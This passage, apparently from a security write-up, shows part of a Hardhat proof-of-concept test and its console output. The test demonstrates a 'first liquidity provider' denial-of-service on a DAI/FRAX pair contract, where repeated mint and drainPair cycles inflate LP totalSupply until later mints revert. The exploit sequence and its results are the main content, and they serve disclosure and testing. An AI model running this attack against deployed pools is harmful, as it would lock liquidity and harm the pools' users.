<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1"> === </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">token0</span><span class="mtk1">()) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">pairTokenABalance</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">equal</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">, </span><span class="mtk8">`Cycle </span><span class="mtk4">${</span><span class="mtk12">i</span><span class="mtk1">+</span><span class="mtk7">1</span><span class="mtk4">}</span><span class="mtk8">: </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> balance in pair should be 1 after drain`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">pairTokenBBalance</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">equal</span><span class="mtk1">(</span><span class="mtk7">2</span><span class="mtk1">, </span><span class="mtk8">`Cycle </span><span class="mtk4">${</span><span class="mtk12">i</span><span class="mtk1">+</span><span class="mtk7">1</span><span class="mtk4">}</span><span class="mtk8">: </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> balance in pair should be 2 after drain`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            } </span><span class="mtk15">else</span><span class="mtk1"> { </span><span class="mtk3">// tokenB is token0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">pairTokenBBalance</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">equal</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">, </span><span class="mtk8">`Cycle </span><span class="mtk4">${</span><span class="mtk12">i</span><span class="mtk1">+</span><span class="mtk7">1</span><span class="mtk4">}</span><span class="mtk8">: </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> balance in pair should be 1 after drain`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">pairTokenABalance</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">equal</span><span class="mtk1">(</span><span class="mtk7">2</span><span class="mtk1">, </span><span class="mtk8">`Cycle </span><span class="mtk4">${</span><span class="mtk12">i</span><span class="mtk1">+</span><span class="mtk7">1</span><span class="mtk4">}</span><span class="mtk8">: </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> balance in pair should be 2 after drain`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"</span><span class="mtk6">\n</span><span class="mtk8">Attempting final mint which should fail..."</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Last attempt to mint after inflating totalSupply</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">MINT_AMOUNT</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">MINT_AMOUNT</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk11">expect</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">).</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk12">be</span><span class="mtk1">.</span><span class="mtk12">reverted</span><span class="mtk1">; </span><span class="mtk3">// PoC expects revert, likely due to overflow or ILM with huge totalSupply</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"</span><span class="mtk6">\n</span><span class="mtk8">Test finished: Successfully demonstrated vulnerability and final mint reverted."</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}); </span></span></span></code></pre>
<pre data-index="32" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">Vulnerability</span><span class="mtk1"> </span><span class="mtk11">Test</span><span class="mtk1"> (</span><span class="mtk12">First</span><span class="mtk1"> </span><span class="mtk12">Liquidity</span><span class="mtk1"> </span><span class="mtk12">Provider</span><span class="mtk1"> </span><span class="mtk12">DOS</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Pair</span><span class="mtk1"> Address: </span><span class="mtk7">0x0CECE5951F0aa1b0916435405acEC8dB1fD49Ef9</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">Token0: </span><span class="mtk7">0x5FbDB2315678afecb367f032d93F642f64180aa3</span><span class="mtk1"> (</span><span class="mtk12">DAI</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">Token1: </span><span class="mtk7">0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512</span><span class="mtk1"> (</span><span class="mtk12">FRAX</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">1</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">9999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">10000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">2</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">50000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">50000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">3</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">250000100000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">250000100000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">4</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">1250000750000150000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">1250000750000150000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">5</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">6250005000001500000200000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">6250005000001500000200000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">6</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">31250031250012500002500000250000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">31250031250012500002500000250000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">7</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">156250187500093750025000003750000300000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">156250187500093750025000003750000300000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">8</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">781251093750656250218750043750005250000350000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">781251093750656250218750043750005250000350000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">9</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">3906256250004375001750000437500070000007000000400000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">3906256250004375001750000437500070000007000000400000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">10</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">19531285156278125013125003937500787500105000009000000450000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">19531285156278125013125003937500787500105000009000000450000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">Cycle</span><span class="mtk1"> </span><span class="mtk7">11</span><span class="mtk1">/</span><span class="mtk7">11</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Transferred</span><span class="mtk1"> </span><span class="mtk7">10000000</span><span class="mtk1"> </span><span class="mtk4">of</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">and</span><span class="mtk1"> </span><span class="mtk12">FRAX</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Minted</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1">. </span><span class="mtk12">Attacker</span><span class="mtk1"> </span><span class="mtk12">LP</span><span class="mtk1"> Balance: </span><span class="mtk7">97656445312675781343750032812507875001312500150000011250000500000009999000</span><span class="mtk1">, </span><span class="mtk12">Pair</span><span class="mtk1"> TotalSupply: </span><span class="mtk7">97656445312675781343750032812507875001312500150000011250000500000010000000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Called</span><span class="mtk1"> </span><span class="mtk12">drainPair</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">Pair</span><span class="mtk1"> </span><span class="mtk12">DAI</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> </span><span class="mtk12">after</span><span class="mtk1"> drain: </span><span class="mtk7">1</span></span></span>
